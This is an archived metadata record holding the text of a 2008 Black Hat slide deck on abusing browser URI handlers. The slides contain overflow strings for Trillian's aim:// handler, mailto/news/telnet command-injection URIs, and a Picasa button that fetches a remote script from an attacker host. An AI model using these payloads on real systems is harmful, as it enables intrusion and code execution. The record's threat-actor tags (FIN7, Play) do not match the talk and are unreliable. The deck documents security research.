{
    "id": "713cc600-3854-4083-9843-29a2c17c07a7",
    "created_at": "2024-04-24T02:05:27.263961Z",
    "updated_at": "2025-03-27T02:16:25.938708Z",
    "deleted_at": null,
    "sha1_hash": "041bf9937d8de94b458cb75f3d70a0961bc6b96d",
    "title": "PowerPoint Presentation",
    "authors": "",
    "file_creation_date": "2008-02-27T16:14:11Z",
    "file_modification_date": "2008-02-27T16:17:23Z",
    "file_size": 1637448,
    "plain_text": "# URI Use and Abuse\n\n\n-----\n\n# Contributing Authors\n\n#### • Nathan McFeters – Senior Security Analyst – Ernst & Young Advanced Security Center, Chicago\n • Billy Kim Rios – Senior Researcher – Microsoft, Seattle\n • Rob Carter – Security Analyst – Ernst & Young Advanced Security Center, Houston\n\n\n-----\n\n# URIs – An Overview\n\n#### • Generic\n\n##### – http://, ftp://, telnet://, etc.\n\n#### • What else is registered?\n\n##### – aim://, firefoxurl://, picasa://, itms://, etc.\n\n\n-----\n\n## URIs – Interaction With Browsers\n\n#### • Developers create URI hooks in the registry for their applications\n • Once registered they can be accessed and interacted with through the browser\n • XSS can play too!\n\n\n-----\n\n## URI Discovery – Where and What?\n\n#### • RFC 4395 defines an IANA-maintained registry of URI Schemes\n • W3C maintains *retired* schemes\n • AHA! The registry! Enter DUH!\n\n\n-----\n\n# DUH Tool – Sample Output\n\n\n-----\n\n## Attacking URIs – Attack Scope\n\n#### • URIs link to applications\n • Applications are vulnerable to code flaws and functionality abuse\n • URIs can be accessed by XSS exposures\n\n\n-----\n\n## Stack Overflow in Trillian’s aim.dll Through the aim:// URI\n\n#### • The aim:// URI is associated with the command ‘Rundll32.exe “C:\\Program Files\\Trillian\\plugins\\aim.dll”, aim_util_urlHandler url=”%1” ini=\"c:\\program files\\trillian\\users \\default\\cache\\pending_aim.ini”’.\n\n\n-----\n\n## Stack Overflow in Trillian’s aim.dll Through the aim:// URI\n\n#### • Attacker controls the value that is put into aim_util_urlHandler through the URI, such as aim://MyURL. \n • Value is copied without bounds checking leading to a stack overflow\n\n\n-----\n\n## Stack Overflow in Trillian’s aim.dll Through the aim:// URI\n\n###### Example:\n • aim:///#1111111/11111111111111111111111111111111111 1111111111111111111111111122222222222222222222222 2222222222222222222222222222222222222233333333333 3333333333333333333333333333333333333333333333333 3444444444444444444444444444444444444444444444444 4444444444444555555555555555555555555555555555555 55555555555555555555555556666666AAAABBBB6666666 6666666666666666666666666666666666666666666666666 6666677777777777777777777777777777777777777777777 7777777777777777788888888888888888888888888888888 8888888888888888888888888888899999999999999999999 9999999999999999999999999999999999999999900000000 0000000000000000000000000000000000000000000000000\n\n\n-----\n\n## Stack Overflow Caught By OllyDbg\n\n\n-----\n\n## Control of Pointer to Next SEH Record and SE Handler\n\n\n-----\n\n### Command Injection in Call to Trillian’s aim.dll Through XSS\n\n#### • The command associated with aim:// takes two arguments, “URL” (which we control) and “ini”, which is set by default to C:\\Program Files\\Trillian\\users \\default\\cache \\pending_aim.ini.\n\n\n-----\n\n### Command Injection in Call to Trillian’s aim.dll Through XSS\n\n#### • Attacker can inject a “ to close off the “uri” command line argument and can then inject a new “ini” parameter.\n • The “ini” parameter is used to specify a file location to write startup data to.\n • We can control some of that startup data through the aim:// URI.\n\n\n-----\n\n### Command Injection in Call to Trillian’s aim.dll Through XSS\n\n\n-----\n\n#### Bug in Microsoft’s IFrame.dll Through res:// URI (MS07-035)\n\n##### • The res:// URI is a predefined pluggable protocol in Microsoft that allows content like images, html, xsl, etc. to be pulled from DLLs or executables. Ex: res://ieframe.dll/info_48.png\n • You have seen this, you just might not know it, if you have a 404 page or common error pages in IE, you’ll see a blue ?, this is loaded using res://\n\n\n-----\n\n#### Bug in Microsoft’s IFrame.dll Through res:// URI (MS07-035)\n\n • Playing with the res:// URI, it was discovered the browser would crash if the following URI was accessed: res://ieframe.dll/#111111/1\n • Further testing led to res://ieframe.dll/#111111AAAAAA… (long string of A’s)…AA/1, which caused\n\n\n-----\n\n#### Bug in Microsoft’s IFrame.dll Through res:// URI (MS07-035)\n\n\n-----\n\n#### Bug in Microsoft’s IFrame.dll Through res:// URI (MS07-035)\n\n\n-----\n\n### Cross Browser Scripting – IE pwns Firefox and Netscape Navigator\n\n##### • Firefox and Netscape Navigator 9 register URIs to be “compliant with Windows Vista”. \n • These URIs (“firefoxurl” and “navigatorurl”) are vulnerable to command injection when called from IE.\n • Gecko based browsers accept the –chrome argument, and we can inject this to supply arbitrary JavaScript code that allows us to\n\n\n-----\n\n### Cross Browser Scripting – IE pwns Firefox and Netscape Navigator\n\n\n-----\n\n## Command Injection in Firefox and All Gecko Based Browsers,\n Microsoft Outlook, etc.\n\n#### • This is actually caused by a flaw in Microsoft’s shell32.dll file on non-Vista machines.\n • Was fixed for Firefox by Mozilla Sec. Team for Firefox in version 2.0.0.7.\n\n\n-----\n\n## Command Injection in Firefox and All Gecko Based Browsers,\n Microsoft Outlook, etc.\n\n\n-----\n\n## Command Injection in Firefox and All Gecko Based Browsers,\n Microsoft Outlook, etc.\n\n###### • The following URIs will cause a command injection:\n – mailto:%00%00../../../../../../windows/system32/cmd\".exe ../../. ./../../../../../windows/system32/calc.exe \" - \" blah.bat – nntp:%00%00../../../../../../windows/system32/cmd\".exe ../../../ ../../../../../windows/system32/calc.exe \" - \" blah.bat – news:%00%00../../../../../../windows/system32/cmd\".exe ../../.. /../../../../../windows/system32/calc.exe \" - \" blah.bat – snews:%00%00../../../../../../windows/system32/cmd\".exe ../../ ../../../../../../windows/system32/calc.exe \" - \" blah.bat – telnet:%00%00../../../../../../windows/system32/cmd\".exe ../../.. /../../../../../windows/system32/calc.exe \" - \" blah.bat\n\n\n-----\n\n### Trust-based Applet Attack against Google’s Picasa (T-bAG)\n\n#### • picasa://importbutton?url= http://shadyshady.com/evilbutton.xml\n • Yep, that’s right it imports a remote XML description of a button\n • If that button is loaded from OUR server and clicked we get to see all those naughty pictures of your girlfriend\n\n\n-----\n\n### The Plan – Ghetto Whiteboard Edition\n\n\n-----\n\n### The Plan – Ghetto Diagram Edition\n\n###### The Hacker YouTube, MySpace\n\n Hacker Plants XSSVictim Get’s PwnedLoad Flash, Rebind, Steal Images\n\n Victim’s Web Browser\n Attack Server\n\n\n-----\n\n### Trust-based Applet Attack against Google’s Picasa (T-bAG)\n\n###### The button.pbf file looks like so:\n • <?xml version=\"1.0\" encoding=\"utf-8\" ?> <buttons format=\"1\" version=\"1\"> <button id=\"custombutton/evilbutton\" type=\"dynamic\"> <icon name=\"outputlayout/poster_icon\" src=\"runtime\" /> <label>Critical Update Available</label> <tooltip>Click to Download Critical Update</tooltip> <action verb=\"hybrid\"> <param name=\"url\" value=\"http://natemcfeters.com/pwn.py\" /> </action> </button> </buttons>\n\n\n-----\n\n### Trust-based Applet Attack against Google’s Picasa (T-bAG)\n\n###### • When the button is clicked, Picasa starts up its own instance of Internet Explorer to open up whatever is at http://natemcfeters.com/pwn.py\n • The real interesting thing is what Picasa SENDS:\n\n\n-----\n\n# What’s Sent by Picasa?!\n\n\n-----\n\n# Why Flash?\n\n#### • We chose Flash to exploit our client- side attack vector for three reasons:\n\n##### – 1. It is vulnerable to DNS Rebinding attacks. – 2. If a valid crossdomain.xml file is present we can connect back to our attack server. – 3. As of Actionscript 3.0 we now have access to a Socket class that can read and write raw binary data.\n\n\n-----\n\n### Trust-based Applet Attack against Google’s Picasa (T-bAG)\n\n\n-----\n\n# PDP’s PDF Sploit\n\n#### • One of the URI/Protocol handler attack vectors that gained a lot of publicity was the PDF based attack by PDP\n • This was based off of our same mailto: command injection, and in fact, the version in the wild also uses this\n\n\n-----\n\n# Stupid IM Trick\n\n##### • I want to talk to your girlfriend as if I’m you!\n\n###### – ymsgr:sendim?yourGirlFriend&m=I+think+we+sho uld+break+up…+sorry+but+its+you+not+me – gtalk:chat?jid=Pwn1ch1wa@gmail.com – gtalk:call?jid=Pwn1ch1wa@gmail.com – gtalk:voicemail?jid=Pwn1ch1wa@gmail.com – aim:goim?screenname=yourGirlFriend&m=I+really +think+you’d+be+happier+with+Nate – skype, Gadu-Gadu, Jabber, etc.\n\n\n-----\n\n# Yep, They’re Stupid, but…\n\n#### • Aside from stealing your girlfriend and causing a Denial of Service on you…\n • What if you could XSS a lot of people from one page and then force their browsers to loop through sending as many of these messages as possible?\n • DDoS on all chat providers anyone?\n\n\n-----\n\n# What’s Next? *Nix Anyone?\n\n###### • Why oh why is no one talking about *Nix yet. Why?  No registry… or is there? AHA! DUH4Linux.sh!\n • #!/bin/bash gconftool-2 /desktop/gnome/url-handlers --all-dirs | cut -- delimiter=/ -f 5 | while read line; do {\n gconftool-2 /desktop/gnome/url-handlers/$line -a | grep - i 'command' | cut --delimiter== -f 2 | while read line2; do {\n echo \"$line           $line2\" } done } done\n\n\n-----\n\n# Output from DUH 4 Linux\n\n###### • -bash-3.00$ ./DUH4Linux.sh\n • man gnome-help \"%s\"\n • cdda   /usr/libexec/gnome-cdda-handler %s\n • aim           gaim-remote uri \"%s\"\n • info           gnome-help \"%s\"\n • server-settings        nautilus \"%s\"\n • applications           nautilus \"%s\"\n • https          firefox %s\n • unknown         mozilla \"%s\"\n • ghelp          gnome-help \"%s\"\n • h323  gnomemeeting -c %s\n • about   firefox %s\n • trash          nautilus \"%s\"\n • http           firefox %s\n • system-settings        nautilus \"%s\"\n • callto          gnomemeeting -c %s\n • mailto          evolution %s\n\n\n-----\n\n## An Apple a Day Keeps the Hackers at Bay? Yeah, right.\n\n#### • DUH4Mac was developed for me by Carl Lindberg, the same guy who brought us RCDefaultApp for turning these off on a Mac\n • Has already helped us uncover on bug in Mac URI handlers\n\n\n-----\n\n# Output From DUH4Mac\n\n###### • URL Name App Bundle ID App (Current Path)\n • mailto Mail (/Applications/Mail.app)\n • pcast com.apple.itunes iTunes (/Applications/iTunes.app)\n • x-man-page Terminal (/Applications/Utilities/Terminal.app)\n • ftp org.mozilla.firefox Firefox (/Applications/Firefox.app)\n • im iChat (/Applications/iChat.app)\n • applescript Editor (/Applications/AppleScript/ScriptEditor.app)\n • webcalcom.apple.ical iCal (/Applications/iCal.app)\n • directoryconnection (/Applications/Utilities/Directory Utility.app)\n • rtsp QuickTime (/Applications/QuickTime Player.app)\n • Keynote Keynote (/Applications/iWork '06/Keynote.app)\n • ichat iChat (/Applications/iChat.app)\n • feed Safari (/Applications/Safari.app)\n • ssh Terminal (/Applications/Utilities/Terminal.app)\n • message Mail (/Applications/Mail.app)\n • afp Finder (/System/Library/CoreServices/Finder.app)\n • daap com.apple.itunes iTunes (/Applications/iTunes.app)\n • mmsu WMV (/Applications/Flip4Mac/WMV Player.app)\n • …\n\n\n-----\n\n## iPhoto Pwnage for Fun and Profit\n\n#### • A format string vulnerability exists in iPhoto which can be triggered by enticing a user to subscribe to a maliciously crafted photocast\n • A remote attacker may be able to cause arbitrary execution of code\n\n\n-----\n\n## iPhoto Pwnage for Fun and Profit\n\n\n-----\n\n## iPhoto Pwnage for Fun and Profit\n\n\n-----\n\n## iPhoto Pwnage for Fun and Profit\n\n\n-----\n\n## iPhoto Pwnage for Fun and Profit\n\n\n-----\n\n## iPhoto Pwnage for Fun and Profit\n\n\n-----\n\n## iPhoto Pwnage for Fun and Profit\n\n\n-----\n\n## iPhoto Pwnage for Fun and Profit\n\n\n-----\n\n## iPhoto Pwnage for Fun and Profit\n\n\n-----\n\n## And… Just in Time for Tax Season\n\n#### • TurboTax on the Mac brings you friendly URIs… WHY?!\n\n##### – com.intuit.ctg.tpshelpscreen – com.intuit.ctg.tpsformaddress – com.intuit.ctg.tpsformfieldhelp – com.intuit.ctg.easystepjump\n\n\n-----\n\n# Conclusions and Questions\n\n#### • We enjoy guns, beautiful FBI women, and loud music… any ladies out there than can help us with all three?\n • Any questions?\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://www.blackhat.com/presentations/bh-dc-08/McFeters-Rios-Carter/Presentation/bh-dc-08-mcfeters-rios-carter.pdf"
    ],
    "report_names": [
        "bh-dc-08-mcfeters-rios-carter.pdf"
    ],
    "threat_actors": [
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1713924327,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1204128851,
    "ts_modification_date": 1204129043,
    "files": {
        "pdf": "https://archive.orkl.eu/041bf9937d8de94b458cb75f3d70a0961bc6b96d.pdf",
        "text": "https://archive.orkl.eu/041bf9937d8de94b458cb75f3d70a0961bc6b96d.txt",
        "img": "https://archive.orkl.eu/041bf9937d8de94b458cb75f3d70a0961bc6b96d.jpg"
    }
}